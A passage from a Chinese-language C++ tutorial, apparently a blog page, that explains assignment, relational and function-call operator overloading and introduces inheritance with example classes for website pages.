class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><span class="hljs-comment">//test02();</span><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总结： 前置递增返回引用，后置递增返回值</p></blockquote><h4 id="4-5-4-赋值运算符重载"><a href="#4-5-4-赋值运算符重载" class="headerlink" title="4.5.4 赋值运算符重载"></a>4.5.4 赋值运算符重载</h4><p>c++编译器至少给一个类添加4个函数</p><ol><li>默认构造函数(无参，函数体为空)</li><li>默认析构函数(无参，函数体为空)</li><li>默认拷贝构造函数，对属性进行值拷贝</li><li>赋值运算符 operator&#x3D;, 对属性进行值拷贝</li></ol><p>如果类中有属性指向堆区，做赋值操作时也会出现深浅拷贝问题</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> age)<br>&#123;<br><span class="hljs-comment">//将年龄数据开辟到堆区</span><br>m_Age = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(age);<br>&#125;<br><br><span class="hljs-comment">//重载赋值运算符 </span><br>Person&amp; <span class="hljs-keyword">operator</span>=(Person &amp;p)<br>&#123;<br><span class="hljs-keyword">if</span> (m_Age != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">delete</span> m_Age;<br>m_Age = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-comment">//编译器提供的代码是浅拷贝</span><br><span class="hljs-comment">//m_Age = p.m_Age;</span><br><br><span class="hljs-comment">//提供深拷贝 解决浅拷贝的问题</span><br>m_Age = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(*p.m_Age);<br><br><span class="hljs-comment">//返回自身</span><br><span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><br><br>~<span class="hljs-built_in">Person</span>()<br>&#123;<br><span class="hljs-keyword">if</span> (m_Age != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">delete</span> m_Age;<br>m_Age = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//年龄的指针</span><br><span class="hljs-type">int</span> *m_Age;<br><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span>;<br><br><span class="hljs-function">Person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">20</span>)</span></span>;<br><br><span class="hljs-function">Person <span class="hljs-title">p3</span><span class="hljs-params">(<span class="hljs-number">30</span>)</span></span>;<br><br>p3 = p2 = p1; <span class="hljs-comment">//赋值操作</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;p1的年龄为：&quot;</span> &lt;&lt; *p<span class="hljs-number">1.</span>m_Age &lt;&lt; endl;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;p2的年龄为：&quot;</span> &lt;&lt; *p<span class="hljs-number">2.</span>m_Age &lt;&lt; endl;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;p3的年龄为：&quot;</span> &lt;&lt; *p<span class="hljs-number">3.</span>m_Age &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-comment">//int a = 10;</span><br><span class="hljs-comment">//int b = 20;</span><br><span class="hljs-comment">//int c = 30;</span><br><br><span class="hljs-comment">//c = b = a;</span><br><span class="hljs-comment">//cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl;</span><br><span class="hljs-comment">//cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl;</span><br><span class="hljs-comment">//cout &lt;&lt; &quot;c = &quot; &lt;&lt; c &lt;&lt; endl;</span><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-5-5-关系运算符重载"><a href="#4-5-5-关系运算符重载" class="headerlink" title="4.5.5 关系运算符重载"></a>4.5.5 关系运算符重载</h4><p>**作用：**重载关系运算符，可以让两个自定义类型对象进行对比操作</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>(string name, <span class="hljs-type">int</span> age)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;m_Name = name;<br><span class="hljs-keyword">this</span>-&gt;m_Age = age;<br>&#125;;<br><br><span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>==(Person &amp; p)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;m_Name == p.m_Name &amp;&amp; <span class="hljs-keyword">this</span>-&gt;m_Age == p.m_Age)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>!=(Person &amp; p)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;m_Name == p.m_Name &amp;&amp; <span class="hljs-keyword">this</span>-&gt;m_Age == p.m_Age)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br><br>string m_Name;<br><span class="hljs-type">int</span> m_Age;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//int a = 0;</span><br><span class="hljs-comment">//int b = 0;</span><br><br><span class="hljs-function">Person <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-string">&quot;孙悟空&quot;</span>, <span class="hljs-number">18</span>)</span></span>;<br><span class="hljs-function">Person <span class="hljs-title">b</span><span class="hljs-params">(<span class="hljs-string">&quot;孙悟空&quot;</span>, <span class="hljs-number">18</span>)</span></span>;<br><br><span class="hljs-keyword">if</span> (a == b)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;a和b相等&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;a和b不相等&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-keyword">if</span> (a != b)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;a和b不相等&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;a和b相等&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-5-6-函数调用运算符重载"><a href="#4-5-6-函数调用运算符重载" class="headerlink" title="4.5.6 函数调用运算符重载"></a>4.5.6 函数调用运算符重载</h4><ul><li>函数调用运算符 ()  也可以重载</li><li>由于重载后使用的方式非常像函数的调用，因此称为仿函数</li><li>仿函数没有固定写法，非常灵活</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyPrint</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(string text)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; text &lt;&lt; endl;<br>&#125;<br><br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//重载的（）操作符 也称为仿函数</span><br>MyPrint myFunc;<br><span class="hljs-built_in">myFunc</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAdd</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> v1, <span class="hljs-type">int</span> v2)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> v1 + v2;<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>MyAdd add;<br><span class="hljs-type">int</span> ret = <span class="hljs-built_in">add</span>(<span class="hljs-number">10</span>, <span class="hljs-number">10</span>);<br>cout &lt;&lt; <span class="hljs-string">&quot;ret = &quot;</span> &lt;&lt; ret &lt;&lt; endl;<br><br><span class="hljs-comment">//匿名对象调用  </span><br>cout &lt;&lt; <span class="hljs-string">&quot;MyAdd()(100,100) = &quot;</span> &lt;&lt; <span class="hljs-built_in">MyAdd</span>()(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>) &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><span class="hljs-built_in">test02</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-6-继承"><a href="#4-6-继承" class="headerlink" title="4.6  继承"></a>4.6  继承</h3><p><strong>继承是面向对象三大特性之一</strong></p><p>我们发现，定义这些类时，下级别的成员除了拥有上一级的共性，还有自己的特性。</p><p>这个时候我们就可以考虑利用继承的技术，减少重复代</p><h4 id="4-6-1-继承的基本语法"><a href="#4-6-1-继承的基本语法" class="headerlink" title="4.6.1 继承的基本语法"></a>4.6.1 继承的基本语法</h4><p>例如我们看到很多网站中，都有公共的头部，公共的底部，甚至公共的左侧列表，只有中心内容不同</p><p>接下来我们分别利用普通写法和继承的写法来实现网页中的内容，看一下继承存在的意义以及好处</p><p><strong>普通实现：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//Java页面</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Java</span> <br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">header</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">footer</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">left</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;JAVA学科视频&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><span class="hljs-comment">//Python页面</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Python</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">header</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">footer</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">left</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Python学科视频&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><span class="hljs-comment">//C++页面</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CPP</span> <br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">header</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">footer</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">left</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;C++学科视频&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//Java页面</span><br>cout &lt;&lt; <span class="hljs-string">&quot;Java下载视频页面如下： &quot;</span> &lt;&lt; endl;<br>Java ja;<br>ja.<span class="hljs-built_in">header</span>();<br>ja.<span class="hljs-built_in">footer</span>();<br>ja.<span class="hljs-built_in">left</span>();<br>ja.<span class="hljs-built_in">content</span>();<br>cout &lt;&lt; <span class="hljs-string">&quot;--------------------&quot;</span> &lt;&lt; endl;<br><br><span class="hljs-comment">//Python页面</span><br>cout &lt;&lt; <span class="hljs-string">&quot;Python下载视频页面如下： &quot;</span> &lt;&lt; endl;<br>Python py;<br>py.<span class="hljs-built_in">header</span>();<br>py.<span class="hljs-built_in">footer</span>();<br>py.<span class="hljs-built_in">left</span>();<br>py.<span class="hljs-built_in">content</span>();<br>cout &lt;&lt; <span class="hljs-string">&quot;--------------------&quot;</span> &lt;&lt; endl;<br><br><span class="hljs-comment">//C++页面</span><br>cout &lt;&lt; <span class="hljs-string">&quot;C++下载视频页面如下： &quot;</span> &lt;&lt; endl;<br>CPP cp;<br>cp.<span class="hljs-built_in">header</span>();<br>cp.<span class="hljs-built_in">footer</span>();<br>cp.<span class="hljs-built_in">left</span>();<br>cp.<span class="hljs-built_in">content</span>();<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>继承实现：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//公共页面</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BasePage</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">header</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">footer</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">left</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;<br>&#125;<br><br>&#125;;<br><br><span class="hljs-comment">//Java页面</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Java</span> : <span class="hljs-keyword">public</span> BasePage<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;JAVA学科视频&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><span class="hljs-comment">//Python页面</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Python</span> : <span class="hljs-keyword">public</span> BasePage<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Python学科视频&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><span class="hljs-comment">//C++页面</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CPP</span> : <span class="hljs-keyword">public</span> BasePage<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;C++学科视频&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//Java页面</span><br>cout &lt;&lt; <span class="hljs-string">&quot;Java下载视频页面如下： &quot;</span> &lt;&lt; endl;<br>Java ja;<br>ja.<span class="hljs-built_in">header</span>();<br>ja.<span class="hljs-built_in">footer</span>();<br>ja.<span class="hljs-built_in">left</span>();<br>ja.<span class="hljs-built_in">content</span>();<br>cout &lt;&lt; <span class="hljs-string">&quot;--------------------&quot;</span> &lt;&lt; endl;<br><br><span class="hljs-comment">//Python页面</span><br>cout &lt;&lt; <span class="hljs-string">&quot;Python下载视频页面如下： &quot;</span> &lt;&lt; endl;<br>Python py;<br>py.<span class="hljs-built_in">header</span>();<br>py.<span class="hljs-built_in">footer</span>();<br>py.<span class="hljs-built_in">left</span>();<br>py.<span class="hljs-built_in">content</span>();<br>cout &lt;&lt; <span class="hljs-string">&quot;--------------------&quot;</span> &lt;&lt; endl;<br><br><span class="hljs-comment">//C++页面</span><br>cout &lt;&lt; <span class="hljs-string">&quot;C++下载视频页面如下： &quot;</span> &lt;&lt; endl;<br>CPP cp;<br>cp.<span class="hljs-built_in">header</span>();<br>cp.<span class="hljs-built_in">footer</span>();<br>cp.<span class="hljs-built_in">left</span>();<br>cp.<span class="hljs-built_in">content</span>();<br><br><br>&#125;<br><br><span class="hljs-function"><span 